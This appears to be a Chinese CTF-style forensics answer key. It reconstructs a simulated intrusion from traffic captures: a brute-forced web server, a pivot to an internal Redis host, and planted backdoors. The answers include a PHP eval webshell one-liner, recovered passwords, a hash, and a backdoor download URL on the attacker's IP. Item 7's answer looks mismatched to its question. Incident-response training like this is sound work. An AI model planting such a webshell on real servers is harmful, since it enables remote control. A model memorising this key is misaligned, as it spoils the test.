数据赛第三题
---
N-EM-00003
黑客团伙采用爆破的方法控制了一台外网web服务器 , 并且以此为跳板 , 进入了企业的内部网络 , 获得了企业内网的权限 , 并且植入了后门 , 达到长期控制的目的 , 你现在获得了攻击时间段所有的流量包 , 请基于次分析溯源黑客在攻击过程中做了那些操作 ?
1. 攻击者IP是多少 ? 
```
172.16.10.112
```
2. 攻击者发送给服务器的第一个HTTP请求的时间是 ? 
```
11:58:45
```
3. 黑客第一次成功登录目标服务器后台的账号和密码是 ? 
```
admin:admin123
```
4. 爆破出正确的目标服务器 admin 的密码前面 , 总共尝试爆破了几次 ? 
```
3
```
5. 黑客是什么时候对网站开始目录扫描的 ? 
```
12:05:48
```
6. 黑客在成功登录phpmyadmin前手工尝试了几个错误密码 ?
```
4
```
7. 目标网站 admin 用户的密文是什么 ?
```
root:root
```
8. 目标网站 mtfly 用户在数据库中的密码的密文是什么 ? 
```
$P$BCIX.GHuePX.kNtTjEWd6QCnzYFzrT1
```
9. 黑客修改了 mtfly 的密码密文为 ?
```
e10adc3949ba59abbe56e057f20f883e
```
10. 黑客写入目标服务器的一句话木马是 ? 
```
<?php eval($_POST[ge]);>
```
11. 网站根目录的绝对目录是什么 ?
```
C:\phpStudy\WWW\
```
12. 黑客执行 whoami 后的命令是什么 ? 
```
systeminfo
```
13. 目标服务器操作系统的 administrator 的密码是什么 ? 
```
Simplexue123
```
14. 黑客在目标服务器上植入了一个木马 , 木马上线的端口是什么 ? 
```
4455
```
15. 黑客以第一台主机为跳板入侵了内网中的一台redis服务器，跳板机第一次连接redis的时间是？（注：北京时间，格式为时:分:秒）
```
12:45:28
```
16. Redis服务器开放redis服务的端口号是？
```
8889
```
17. 黑客在redis服务器上下载了一个后门文件，请问下载的地址是？
```
http://172.16.10.112/backboor.zip
```
18. 黑客控制了redis服务器，用nmap对内网中另外一台web服务器发起了扫描，请问开始的时间是？（注：北京时间，格式为时:分:秒）
```
13:23:44
```
19. 黑客连接内网web服务器的一句话木马的密码是？
```
simple
```
20. 最后黑客在内网服务器上下载了一个后门文件，该后门文件的文件名是？
```
backboor2.zip
```

